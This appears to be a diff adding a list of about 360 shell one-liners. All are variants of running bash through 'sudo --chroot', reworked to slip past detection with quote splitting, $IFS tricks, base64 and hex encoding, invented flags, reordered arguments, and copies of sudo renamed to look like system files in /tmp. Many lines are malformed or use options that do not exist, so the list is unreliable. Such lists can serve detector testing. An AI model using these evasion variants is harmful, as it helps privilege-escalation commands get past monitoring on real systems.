@@ -1,0 +1,360 @@
+1. `sudo --"chroot" /mnt /bin/bash -c "whoami"`
+2. `sudo --ch"root" /mnt /bin/bash -c "whoami"`
+3. `sudo --chro"ot" /mnt /bin/bash -c "whoami"`
+4. `sudo --chroot /"mnt" /bin/bash -c "whoami"`
+5. `sudo --chroot /mnt /"bin"/bash -c "whoami"`
+6. `sudo --chroot /mnt /bin/"bash" -c "whoami"`
+7. `sudo --chroot /mnt /bin/bash -c "who"ami"`
+8. `sudo --chroot /mnt /bin/bash -c "wh"oami"`
+9. `sudo --chroot /mnt /bin/bash -c "whoa"mi"`
+10. `sudo --chroot /mnt /bin/bash -c "whoami"" "`
+11. `sudo --chroot /mnt /bin/bash -c "whoami" #`
+12. `sudo --chroot /mnt /bin/bash -c "whoami" ""`
+13. `sudo --chroot /mnt /bin/bash -c "wh""oami"`
+14. `sudo --chroot /mnt /bin/bash -c ""whoami"`
+15. `sudo --chroot /mnt /bin/bash -c "whoami"""`
+16. `sudo --chroot /mnt /bin/bash -c "whoa""mi"`
+17. `sudo --chroot /mnt /bin/bash -c "whoam""i"`
+18. `sudo --chroot /mnt /bin/ba"sh" -c "whoami"`
+19. `sudo --chroot /mnt /bin/bash -c "wh oami"`
+20. `sudo --chroot /mnt /bin/bash -c "whoa mi"`
+21. `sudo --chroot /mnt /bin/bash -c "whoami "`
+22. `sudo --chroot /mnt /bin/bash -c " whoami"`
+23. `sudo --chroot /mnt /bin/bash -c "whoami";`
+24. `sudo --chroot /mnt /bin/bash -c "whoami" --`
+25. `sudo --chroot /mnt /bin/bash -c "whoami" #test`
+26. `sudo --chroot /mnt /bin/bash -c "whoami" /*injected*/`
+27. `sudo --chroot /mnt /bin/bash -c "whoami" >/dev/null`
+28. `sudo --chroot /mnt /bin/bash -c "wh"oa"mi"`
+29. `sudo --chroot /mnt /bin/bash -c "w""h""o""a""m""i"`
+30. `sudo --chroot /mnt /bin/bash -c "$('whoami')"`
+1. `sudo --chroot /mnt /bin/bash -c "wh\oami"`
+2. `sudo --chroot /mnt /bin/bash -c "wh/**/oami"`
+3. `sudo --chroot /mnt /bin/bash -c "$PATH/whoami"`
+4. `sudo --chroot /mnt /bin/bash -c "$(echo whoami)"`
+5. `sudo --chroot /mnt /bin/bash -c "$(wh""oami)"`
+6. `sudo --chroot /mnt /bin/bash -c "wh$(echo oami)"`
+7. `sudo --chroot /mnt /bin/bash -c "$(who""ami)"`
+8. `sudo --chroot /mnt /bin/bash -c "whoami"$IFS`
+9. `sudo --chroot /mnt /bin/bash -c "$IFS""whoami"`
+10. `sudo --chroot /mnt /bin/bash -c "$IFS""wh""oami"`
+11. `sudo --chroot /mnt /bin/bash -c "whoa$IFS""mi"`
+12. `sudo --chroot /mnt /bin/bash -c "who"$IFS"ami"`
+13. `sudo --chroot /mnt /bin/bash -c "who${IFS}ami"`
+14. `sudo --chroot /mnt /bin/bash -c "$((0+1))whoami"`
+15. `sudo --chroot /mnt /bin/bash -c "w\h\o\a\m\i"`
+16. `sudo --chroot /mnt /bin/bash -c "wh$(true)oami"`
+17. `sudo --chroot /mnt /bin/bash -c "wh$(echo)oami"`
+18. `sudo --chroot /mnt /bin/bash -c "whoa\\mi"`
+19. `sudo --chroot /mnt /bin/bash -c "wh"\\"oami"`
+20. `sudo --chroot /mnt /bin/bash -c "'whoami'"`
+21. `sudo --chroot /mnt /bin/bash -c "wh\#oami"`
+22. `sudo --chroot /mnt /bin/bash -c "wh/**/o/**/ami"`
+23. `sudo --chroot /mnt /bin/bash -c "who""\a""mi"`
+24. `sudo --chroot /mnt /bin/bash -c "wh\$(echo oami)"`
+25. `sudo --chroot /mnt /bin/bash -c "$HOME/../bin/whoami"`
+26. `sudo --chroot /mnt /bin/bash -c "$(base64 -d <<< d2hvYW1p)"`
+27. `sudo --chroot /mnt /bin/bash -c "$0 whoami"`
+28. `sudo --chroot /mnt /bin/bash -c "who$IFS$IFS""ami"`
+29. `sudo --chroot /mnt /bin/bash -c "$(wh$IFS""oami)"`
+30. `sudo --chroot /mnt /bin/bash -c "$(wh/**/oami)"`
+1. `sudo --directory=/mnt /bin/bash -c "whoami"`
+2. `sudo --root=/mnt /bin/bash -c "whoami"`
+3. `sudo -R /mnt /bin/bash -c "whoami"`
+4. `sudo --pivot-root=/mnt /bin/bash -c "whoami"`
+5. `sudo --alt-root=/mnt /bin/bash -c "whoami"`
+6. `sudo --fake-root=/mnt /bin/bash -c "whoami"`
+7. `sudo --cwd=/mnt /bin/bash -c "whoami"`
+8. `sudo --env=CHROOT=/mnt /bin/bash -c "whoami"`
+9. `sudo --set-home --directory=/mnt /bin/bash -c "whoami"`
+10. `sudo -R=/mnt /bin/bash -c "whoami"`
+11. `sudo --ch-root=/mnt /bin/bash -c "whoami"`
+12. `sudo --rootdir=/mnt /bin/bash -c "whoami"`
+13. `sudo --mount=/mnt /bin/bash -c "whoami"`
+14. `sudo --workdir=/mnt /bin/bash -c "whoami"`
+15. `sudo --jail=/mnt /bin/bash -c "whoami"`
+16. `sudo --alt-chroot=/mnt /bin/bash -c "whoami"`
+17. `sudo --croot=/mnt /bin/bash -c "whoami"`
+18. `sudo --rdir=/mnt /bin/bash -c "whoami"`
+19. `sudo --droot=/mnt /bin/bash -c "whoami"`
+20. `sudo --path=/mnt /bin/bash -c "whoami"`
+21. `sudo --newroot=/mnt /bin/bash -c "whoami"`
+22. `sudo --sandbox=/mnt /bin/bash -c "whoami"`
+23. `sudo --zone=/mnt /bin/bash -c "whoami"`
+24. `sudo --subroot=/mnt /bin/bash -c "whoami"`
+25. `sudo --container-root=/mnt /bin/bash -c "whoami"`
+26. `sudo --mnt-root=/mnt /bin/bash -c "whoami"`
+27. `sudo --host-root=/mnt /bin/bash -c "whoami"`
+28. `sudo --base-dir=/mnt /bin/bash -c "whoami"`
+29. `sudo --dir-root=/mnt /bin/bash -c "whoami"`
+30. `sudo --source=/mnt /bin/bash -c "whoami"`
+1. `sudo --filesystem-root=/mnt /bin/bash -c "whoami"`
+2. `sudo --fake-chroot=/mnt /bin/bash -c "whoami"`
+3. `sudo --mnt-path=/mnt /bin/bash -c "whoami"`
+4. `sudo --fs-root=/mnt /bin/bash -c "whoami"`
+5. `sudo --bootdir=/mnt /bin/bash -c "whoami"`
+6. `sudo --start-dir=/mnt /bin/bash -c "whoami"`
+7. `sudo --basepath=/mnt /bin/bash -c "whoami"`
+8. `sudo --prefix=/mnt /bin/bash -c "whoami"`
+9. `sudo --vfs-root=/mnt /bin/bash -c "whoami"`
+10. `sudo --data-root=/mnt /bin/bash -c "whoami"`
+11. `sudo --mount-root=/mnt /bin/bash -c "whoami"`
+12. `sudo --ch-rootdir=/mnt /bin/bash -c "whoami"`
+13. `sudo --temp-root=/mnt /bin/bash -c "whoami"`
+14. `sudo --linux-root=/mnt /bin/bash -c "whoami"`
+15. `sudo --fsdir=/mnt /bin/bash -c "whoami"`
+16. `sudo --rootfs=/mnt /bin/bash -c "whoami"`
+17. `sudo --dev-root=/mnt /bin/bash -c "whoami"`
+18. `sudo --test-root=/mnt /bin/bash -c "whoami"`
+19. `sudo --vol-root=/mnt /bin/bash -c "whoami"`
+20. `sudo --instance-root=/mnt /bin/bash -c "whoami"`
+21. `sudo --env-root=/mnt /bin/bash -c "whoami"`
+22. `sudo --sandbox-root=/mnt /bin/bash -c "whoami"`
+23. `sudo --guest-root=/mnt /bin/bash -c "whoami"`
+24. `sudo --iso-root=/mnt /bin/bash -c "whoami"`
+25. `sudo --img-root=/mnt /bin/bash -c "whoami"`
+26. `sudo --altfs=/mnt /bin/bash -c "whoami"`
+27. `sudo --virtual-root=/mnt /bin/bash -c "whoami"`
+28. `sudo --mock-root=/mnt /bin/bash -c "whoami"`
+29. `sudo --swap-root=/mnt /bin/bash -c "whoami"`
+30. `sudo --user-root=/mnt /bin/bash -c "whoami"`
+1. `sudo --chroot /mnt /bin/bash -c "whoami"`
+2. `sudo --chroot /mnt /bin/bash -c whoami`
+3. `sudo --chroot /mnt /bin/bash -c whoami\`
+4. `sudo --chroot /mnt /bin/bash -c 'whoami'`
+5. `sudo --chroot /mnt /bin/bash -c $(whoami)`
+6. `sudo --chroot /mnt /bin/bash -c \whoami`
+7. `sudo --chroot /mnt /bin/bash -c "who"`
+8. `sudo --chroot /mnt /bin/bash -c "id -un"`
+9. `sudo --chroot /mnt /bin/bash -c "id"`
+10. `sudo --chroot /mnt /bin/bash -c id`
+11. `sudo --chroot /mnt /bin/bash whoami`
+12. `sudo --chroot /mnt /bin/sh -c "whoami"`
+13. `sudo --chroot /mnt /bin/bash -c`
+14. `sudo --chroot /mnt /bin/bash`
+15. `sudo --chroot /mnt bash -c "whoami"`
+16. `sudo --chroot /mnt /bin/bash -ic "whoami"`
+17. `sudo --chroot /mnt /bin/bash --login -c "whoami"`
+18. `sudo --chroot /mnt /bin/bash --norc -c "whoami"`
+19. `sudo --chroot /mnt /bin/bash -c " whoami"`
+20. `sudo --chroot /mnt /bin/bash -c "whoami "`
+21. `sudo --chroot /mnt /bin/bash -c "w\hoami"`
+22. `sudo --chroot /mnt /bin/bash -c "wh\oami"`
+23. `sudo --chroot /mnt /bin/bash -c "whoa\mi"`
+24. `sudo --chroot /mnt /bin/bash -c "wh\oam\i"`
+25. `sudo --chroot /mnt /bin/bash -c "whoami#"`
+26. `sudo --chroot /mnt /bin/bash -c "#whoami"`
+27. `sudo --chroot /mnt /bin/bash -c who`
+28. `sudo --chroot /mnt /bin/bash -c id -u`
+29. `sudo --chroot /mnt /bin/bash -c id -un`
+30. `sudo --chroot /mnt /bin/bash <<< "whoami"`
+1. `sudo --chroot /mnt /bin/bash -c whoami </dev/null`
+2. `sudo --chroot /mnt /bin/bash -c ''whoami''`
+3. `sudo --chroot /mnt /bin/bash -c \`whoami``
+4. `sudo --chroot /mnt /bin/bash -c "wh oami"`
+5. `sudo --chroot /mnt /bin/bash -c "wh$IFS$oami"`
+6. `sudo --chroot /mnt /bin/bash -c "who""ami"`
+7. `sudo --chroot /mnt /bin/bash -c "who"ami"`
+8. `sudo --chroot /mnt /bin/bash -c "wh"oa"mi"`
+9. `sudo --chroot /mnt /bin/bash -c "wh`echo o`ami"`
+10. `sudo --chroot /mnt /bin/bash -c "$0"`
+11. `sudo --chroot /mnt /bin/bash -c "$USER"`
+12. `sudo --chroot /mnt /bin/bash -c \\\whoami`
+13. `sudo --chroot /mnt /bin/bash -c whoami # comment`
+14. `sudo --chroot /mnt /bin/bash -c whoami\#`
+15. `sudo --chroot /mnt /bin/bash -c "whoami > /dev/null"`
+16. `sudo --chroot /mnt /bin/bash -c " whoami "`
+17. `sudo --chroot /mnt /bin/bash -c whoami`
+18. `sudo --chroot /mnt /bin/bash -c whoami\n`
+19. `sudo --chroot /mnt /bin/bash -c "$(echo whoami)"`
+20. `sudo --chroot /mnt /bin/bash -c "$(wh""oami)"`
+21. `sudo --chroot /mnt /bin/bash -c "$((1+1))"`
+22. `sudo --chroot /mnt /bin/bash -c "$HOSTNAME"`
+23. `sudo --chroot /mnt /bin/bash -c $(id -un)`
+24. `sudo --chroot /mnt /bin/bash -c id -u`
+25. `sudo --chroot /mnt /bin/bash -c id | cut -d' ' -f1`
+26. `sudo --chroot /mnt /bin/bash -c "env | grep USER"`
+27. `sudo --chroot /mnt /bin/bash -c 'id -un'`
+28. `sudo --chroot /mnt /bin/bash -c "echo $USER"`
+29. `sudo --chroot /mnt /bin/bash -c "printf whoami"`
+30. `sudo --chroot /mnt /bin/bash -c "w\\\hoami"`
+1. `sudo /bin/bash -c "whoami" --chroot /mnt`
+2. `/bin/bash -c "whoami" sudo --chroot /mnt`
+3. `-chroot /mnt sudo /bin/bash -c "whoami"`
+4. `/bin/bash sudo -c "whoami" --chroot /mnt`
+5. `/bin/bash --chroot /mnt -c "whoami" sudo`
+6. `sudo /bin/bash --chroot /mnt -c "whoami"`
+7. `sudo -c "whoami" --chroot /mnt /bin/bash`
+8. `/bin/bash -c sudo "whoami" --chroot /mnt`
+9. `-chroot /mnt /bin/bash -c "whoami" sudo`
+10. `sudo --chroot /mnt "whoami" -c /bin/bash`
+11. `sudo -c --chroot /mnt /bin/bash "whoami"`
+12. `-chroot /mnt sudo -c /bin/bash "whoami"`
+13. `/bin/bash --chroot /mnt sudo -c "whoami"`
+14. `/bin/bash -c --chroot /mnt sudo "whoami"`
+15. `sudo /bin/bash -c --chroot /mnt "whoami"`
+16. `sudo /bin/bash "whoami" -c --chroot /mnt`
+17. `sudo --chroot /mnt /bin/bash "whoami" -c`
+18. `/bin/bash "whoami" -c sudo --chroot /mnt`
+19. `-chroot sudo /mnt /bin/bash "whoami" -c`
+20. `-chroot /mnt sudo /bin/bash "whoami" -c`
+21. `/bin/bash sudo --chroot /mnt -c "whoami"`
+22. `sudo --chroot /mnt -c /bin/bash "whoami"`
+23. `/bin/bash --chroot sudo /mnt -c "whoami"`
+24. `/bin/bash -c "whoami" /mnt sudo --chroot`
+25. `sudo /mnt --chroot /bin/bash -c "whoami"`
+26. `/mnt sudo --chroot /bin/bash -c "whoami"`
+27. `/bin/bash "whoami" sudo --chroot /mnt -c`
+28. `sudo -c /bin/bash --chroot /mnt "whoami"`
+29. `/mnt /bin/bash -c "whoami" sudo --chroot`
+30. `-chroot /mnt /bin/bash sudo -c "whoami"`
+1. `sudo /bin/bash --chroot /mnt "whoami" -c`
+2. `-chroot sudo /mnt -c /bin/bash "whoami"`
+3. `sudo "whoami" /bin/bash -c --chroot /mnt`
+4. `/mnt --chroot sudo -c "whoami" /bin/bash`
+5. `/bin/bash -c "whoami" --chroot sudo /mnt`
+6. `/bin/bash "whoami" -c --chroot sudo /mnt`
+7. `sudo /mnt /bin/bash -c "whoami" --chroot`
+8. `-chroot sudo /mnt /bin/bash "whoami" -c`
+9. `/mnt sudo /bin/bash -c "whoami" --chroot`
+10. `/mnt /bin/bash -c sudo "whoami" --chroot`
+11. `sudo /mnt -c "whoami" --chroot /bin/bash`
+12. `sudo /mnt /bin/bash "whoami" -c --chroot`
+13. `/mnt /bin/bash sudo "whoami" -c --chroot`
+14. `-chroot /mnt sudo "whoami" /bin/bash -c`
+15. `/mnt --chroot /bin/bash sudo -c "whoami"`
+16. `/mnt sudo "whoami" --chroot /bin/bash -c`
+17. `/mnt --chroot sudo /bin/bash "whoami" -c`
+18. `sudo "whoami" --chroot /mnt /bin/bash -c`
+19. `sudo /mnt "whoami" --chroot /bin/bash -c`
+20. `/mnt --chroot sudo "whoami" /bin/bash -c`
+21. `-chroot sudo /mnt "whoami" /bin/bash -c`
+22. `sudo "whoami" -c /bin/bash --chroot /mnt`
+23. `-chroot /mnt sudo /bin/bash -c "whoami"`
+24. `/mnt /bin/bash -c --chroot sudo "whoami"`
+25. `sudo -c /mnt --chroot /bin/bash "whoami"`
+26. `/bin/bash -c sudo --chroot "whoami" /mnt`
+27. `/bin/bash sudo /mnt -c "whoami" --chroot`
+28. `sudo /bin/bash "whoami" --chroot -c /mnt`
+29. `-chroot /mnt -c sudo /bin/bash "whoami"`
+30. `sudo -c "whoami" /mnt /bin/bash --chroot`
+1. `sudo --chroot /mnt /bin/bash -c "whoami"`
+2. `sudo --chroot /mnt /bin/bash -c "who\x61mi"`
+3. `sudo --chroot /mnt /bin/bash -c "who\u0061mi"`
+4. `sudo --chroot /mnt /bin/bash -c "who\141mi"`
+5. `sudo --chroot /mnt /bin/bash -c "$(echo d2hvYW1p | base64 -d)"`
+6. `sudo --chroot /mnt /bin/bash -c "`echo '\x77\x68\x6f\x61\x6d\x69'`"`
+7. `sudo --chroot /mnt /bin/bash -c "`echo -e '\167\150\157\141\155\151'`"`
+8. `sudo --chroot /mnt /bin/bash -c "$(perl -e 'print \"whoami\"')"`
+9. `sudo --chroot /mnt /bin/bash -c "$(python3 -c 'print(\"whoami\")')"`
+10. `sudo --chroot /mnt /bin/bash -c "$(printf 'whoami')"`
+11. `sudo --chroot /mnt /bin/bash -c "$(echo 77686f616d69 | xxd -r -p)"`
+12. `sudo --chroot /mnt /bin/bash -c "$(echo -n 'whoami' | base64 -d)"`
+13. `sudo --chroot /mnt /bin/bash -c "$(echo -n 77686f616d69 | xxd -r -p)"`
+14. `sudo --chroot /mnt /bin/bash -c "$((whoami))"`
+15. `sudo --chroot /mnt /bin/bash -c "`echo whoami | tr '[a-z]' '[a-z]'`"`
+16. `sudo --chroot /mnt /bin/bash -c "$(cat <<< "whoami")"`
+17. `sudo --chroot /mnt /bin/bash -c "`cat <<EOF
+18. `sudo --chroot /mnt /bin/bash -c "`cut -c1-6 <<< 'whoami'`"`
+19. `sudo --chroot /mnt /bin/bash -c "`env | grep USER | awk '{print "whoami"}'`"`
+20. `sudo --chroot /mnt /bin/bash -c "$(echo $(cut -c1-6 <<< 'whoami'))"`
+21. `sudo --chroot /mnt /bin/bash -c "$(echo d2hvYW1pCg== | base64 -d)"`
+22. `sudo --chroot /mnt /bin/bash -c "$(python3 -c 'import base64; print(base64.b64decode("d2hvYW1p").decode())')"`
+23. `sudo --chroot /mnt /bin/bash -c "`perl -e 'print join("", map {chr} (119,104,111,97,109,105))'`"`
+24. `sudo --chroot /mnt /bin/bash -c "$(bash -c 'echo whoami')"`
+25. `sudo --chroot /mnt /bin/bash -c "$(bash<<<whoami)"`
+26. `sudo --chroot /mnt /bin/bash -c "$(IFS=;echo w''h''o''a''m''i)"`
+27. `sudo --chroot /mnt /bin/bash -c "$(echo -n '77686f616d69' | xxd -r -p)"`
+28. `sudo --chroot /mnt /bin/bash -c "$(hexdump -e '6/1 "%02x"' <<< whoami | xxd -r -p)"`
+29. `sudo --chroot /mnt /bin/bash -c "$(echo | awk '{print "whoami"}')"`
+30. `sudo --chroot /mnt /bin/bash -c "$(seq 1 1 | xargs -I{} echo whoami)"`
+1. `sudo --chroot /mnt /bin/bash -c "$(echo 'whoami' | rev | rev)"`
+2. `sudo --chroot /mnt /bin/bash -c "$(printf '%s' 'whoami')"`
+3. `sudo --chroot /mnt /bin/bash -c "$(awk 'BEGIN{print "whoami"}')"`
+4. `sudo --chroot /mnt /bin/bash -c "$(echo '77686f616d69' | xxd -r -p)"`
+5. `sudo --chroot /mnt /bin/bash -c "$(perl -e '$_=q(whoami);print')"`
+6. `sudo --chroot /mnt /bin/bash -c "$(bash -c 'echo "whoami"')"`
+7. `sudo --chroot /mnt /bin/bash -c "$(base64 -d <<< d2hvYW1p)"`
+8. `sudo --chroot /mnt /bin/bash -c "$(python -c 'print("who"+"ami")')"`
+9. `sudo --chroot /mnt /bin/bash -c "$(echo -e '\x77\x68\x6f\x61\x6d\x69')"`
+10. `sudo --chroot /mnt /bin/bash -c "$(tr -d '\n' <<< 'whoami')"`
+11. `sudo --chroot /mnt /bin/bash -c "$(cat <<< $(echo whoami))"`
+12. `sudo --chroot /mnt /bin/bash -c "$(echo $(echo whoami))"`
+13. `sudo --chroot /mnt /bin/bash -c "$(<<<whoami cat)"`
+14. `sudo --chroot /mnt /bin/bash -c "$(echo who | tr -d '\n'; echo ami)"`
+15. `sudo --chroot /mnt /bin/bash -c "$(echo 'who'$(echo 'ami'))"`
+16. `sudo --chroot /mnt /bin/bash -c "$(command echo whoami)"`
+17. `sudo --chroot /mnt /bin/bash -c "$(sh -c 'echo whoami')"`
+18. `sudo --chroot /mnt /bin/bash -c "$(bash <<<"whoami")"`
+19. `sudo --chroot /mnt /bin/bash -c "$(echo $(echo $(echo whoami)))"`
+20. `sudo --chroot /mnt /bin/bash -c "$(echo -n 'whoami')"`
+21. `sudo --chroot /mnt /bin/bash -c "$(expr substr whoami 1 6)"`
+22. `sudo --chroot /mnt /bin/bash -c "$(perl -e 'print pack("H*", "77686f616d69")')"`
+23. `sudo --chroot /mnt /bin/bash -c "$(python -c 'import sys; sys.stdout.write("whoami")')"`
+24. `sudo --chroot /mnt /bin/bash -c "$(cut -b1-6 <<< whoami)"`
+25. `sudo --chroot /mnt /bin/bash -c "$(echo | sed 's/^/whoami/')"`
+26. `sudo --chroot /mnt /bin/bash -c "$(bash -c 'whoami')"`
+27. `sudo --chroot /mnt /bin/bash -c "$(env | grep -o whoami || echo whoami)"`
+28. `sudo --chroot /mnt /bin/bash -c "$(IFS=;echo w h o a m i | tr -d ' ')"`
+29. `sudo --chroot /mnt /bin/bash -c "$(dd if=<(echo -n whoami) bs=1 count=6 2>/dev/null)"`
+30. `sudo --chroot /mnt /bin/bash -c "$(yes whoami | head -n1)"`
+1. `cp /usr/bin/sudo /tmp/a.out && /tmp/a.out --chroot /mnt /bin/bash -c "whoami"`
+2. `cp /usr/bin/sudo /dev/shm/s && /dev/shm/s --chroot /mnt /bin/bash -c "whoami"`
+3. `install -m 755 /usr/bin/sudo /tmp/s1 && /tmp/s1 --chroot /mnt /bin/bash -c "whoami"`
+4. `ln /usr/bin/sudo /tmp/x && /tmp/x --chroot /mnt /bin/bash -c "whoami"`
+5. `cp /usr/bin/sudo /tmp/.sudo && /tmp/.sudo --chroot /mnt /bin/bash -c "whoami"`
+6. `cp /usr/bin/sudo /var/tmp/sudo1 && /var/tmp/sudo1 --chroot /mnt /bin/bash -c "whoami"`
+7. `cp /usr/bin/sudo /home/user/sd && /home/user/sd --chroot /mnt /bin/bash -c "whoami"`
+8. `cp /usr/bin/sudo /tmp/init && /tmp/init --chroot /mnt /bin/bash -c "whoami"`
+9. `cp /usr/bin/sudo /tmp/bypass && /tmp/bypass --chroot /mnt /bin/bash -c "whoami"`
+10. `cp /usr/bin/sudo /tmp/exec && /tmp/exec --chroot /mnt /bin/bash -c "whoami"`
+11. `cp /usr/bin/sudo /tmp/run && /tmp/run --chroot /mnt /bin/bash -c "whoami"`
+12. `cp /usr/bin/sudo /tmp/bin && /tmp/bin --chroot /mnt /bin/bash -c "whoami"`
+13. `cp /usr/bin/sudo /tmp/z && /tmp/z --chroot /mnt /bin/bash -c "whoami"`
+14. `cp /usr/bin/sudo /tmp/.hidden && /tmp/.hidden --chroot /mnt /bin/bash -c "whoami"`
+15. `cp /usr/bin/sudo /tmp/.... && /tmp/.... --chroot /mnt /bin/bash -c "whoami"`
+16. `cp /usr/bin/sudo /tmp/sd_bin && /tmp/sd_bin --chroot /mnt /bin/bash -c "whoami"`
+17. `cp /usr/bin/sudo /tmp/bash_launcher && /tmp/bash_launcher --chroot /mnt /bin/bash -c "whoami"`
+18. `cp /usr/bin/sudo /tmp/core && /tmp/core --chroot /mnt /bin/bash -c "whoami"`
+19. `cp /usr/bin/sudo /tmp/test && /tmp/test --chroot /mnt /bin/bash -c "whoami"`
+20. `cp /usr/bin/sudo /tmp/payload && /tmp/payload --chroot /mnt /bin/bash -c "whoami"`
+21. `cp /usr/bin/sudo /tmp/.config && /tmp/.config --chroot /mnt /bin/bash -c "whoami"`
+22. `cp /usr/bin/sudo /tmp/logrotate && /tmp/logrotate --chroot /mnt /bin/bash -c "whoami"`
+23. `cp /usr/bin/sudo /tmp/sysctl && /tmp/sysctl --chroot /mnt /bin/bash -c "whoami"`
+24. `cp /usr/bin/sudo /tmp/cronjob && /tmp/cronjob --chroot /mnt /bin/bash -c "whoami"`
+25. `cp /usr/bin/sudo /tmp/.bash_history && /tmp/.bash_history --chroot /mnt /bin/bash -c "whoami"`
+26. `cp /usr/bin/sudo /tmp/f && /tmp/f --chroot /mnt /bin/bash -c "whoami"`
+27. `cp /usr/bin/sudo /tmp/named && /tmp/named --chroot /mnt /bin/bash -c "whoami"`
+28. `cp /usr/bin/sudo /tmp/launch && /tmp/launch --chroot /mnt /bin/bash -c "whoami"`
+29. `cp /usr/bin/sudo /tmp/sysd && /tmp/sysd --chroot /mnt /bin/bash -c "whoami"`
+30. `cp /usr/bin/sudo /tmp/tmp_sudo && /tmp/tmp_sudo --chroot /mnt /bin/bash -c "whoami"`
+1. `cp /usr/bin/sudo /tmp/u && /tmp/u --chroot /mnt /bin/bash -c "whoami"`
+2. `cp /usr/bin/sudo /tmp/.u_exec && /tmp/.u_exec --chroot /mnt /bin/bash -c "whoami"`
+3. `cp /usr/bin/sudo /dev/shm/root_exec && /dev/shm/root_exec --chroot /mnt /bin/bash -c "whoami"`
+4. `cp /usr/bin/sudo /run/sudo_hidden && /run/sudo_hidden --chroot /mnt /bin/bash -c "whoami"`
+5. `install /usr/bin/sudo /tmp/special && /tmp/special --chroot /mnt /bin/bash -c "whoami"`
+6. `cp /usr/bin/sudo ./runner && ./runner --chroot /mnt /bin/bash -c "whoami"`
+7. `cp /usr/bin/sudo /tmp/start && /tmp/start --chroot /mnt /bin/bash -c "whoami"`
+8. `cp /usr/bin/sudo /var/tmp/launch_root && /var/tmp/launch_root --chroot /mnt /bin/bash -c "whoami"`
+9. `cp /usr/bin/sudo ~/.cache/.run && ~/.cache/.run --chroot /mnt /bin/bash -c "whoami"`
+10. `cp /usr/bin/sudo /tmp/entrypoint && /tmp/entrypoint --chroot /mnt /bin/bash -c "whoami"`
+11. `cp /usr/bin/sudo /tmp/startup && /tmp/startup --chroot /mnt /bin/bash -c "whoami"`
+12. `cp /usr/bin/sudo /tmp/bootx && /tmp/bootx --chroot /mnt /bin/bash -c "whoami"`
+13. `cp /usr/bin/sudo /tmp/w && /tmp/w --chroot /mnt /bin/bash -c "whoami"`
+14. `cp /usr/bin/sudo /tmp/.d && /tmp/.d --chroot /mnt /bin/bash -c "whoami"`
+15. `cp /usr/bin/sudo /tmp/.daemon && /tmp/.daemon --chroot /mnt /bin/bash -c "whoami"`
+16. `cp /usr/bin/sudo /tmp/checker && /tmp/checker --chroot /mnt /bin/bash -c "whoami"`
+17. `cp /usr/bin/sudo /tmp/system_init && /tmp/system_init --chroot /mnt /bin/bash -c "whoami"`
+18. `cp /usr/bin/sudo /tmp/exec_runner && /tmp/exec_runner --chroot /mnt /bin/bash -c "whoami"`
+19. `cp /usr/bin/sudo /tmp/login_bin && /tmp/login_bin --chroot /mnt /bin/bash -c "whoami"`
+20. `cp /usr/bin/sudo /tmp/user_check && /tmp/user_check --chroot /mnt /bin/bash -c "whoami"`
+21. `cp /usr/bin/sudo /tmp/u_exec && /tmp/u_exec --chroot /mnt /bin/bash -c "whoami"`
+22. `cp /usr/bin/sudo /tmp/dash && /tmp/dash --chroot /mnt /bin/bash -c "whoami"`
+23. `cp /usr/bin/sudo /tmp/env_exec && /tmp/env_exec --chroot /mnt /bin/bash -c "whoami"`
+24. `cp /usr/bin/sudo /tmp/_sh && /tmp/_sh --chroot /mnt /bin/bash -c "whoami"`
+25. `cp /usr/bin/sudo /tmp/netinit && /tmp/netinit --chroot /mnt /bin/bash -c "whoami"`
+26. `cp /usr/bin/sudo /tmp/sys_exec && /tmp/sys_exec --chroot /mnt /bin/bash -c "whoami"`
+27. `cp /usr/bin/sudo /tmp/.launchd && /tmp/.launchd --chroot /mnt /bin/bash -c "whoami"`
+28. `cp /usr/bin/sudo /tmp/initd && /tmp/initd --chroot /mnt /bin/bash -c "whoami"`
+29. `cp /usr/bin/sudo /tmp/run_root && /tmp/run_root --chroot /mnt /bin/bash -c "whoami"`
+30. `cp /usr/bin/sudo /tmp/loader && /tmp/loader --chroot /mnt /bin/bash -c "whoami"`
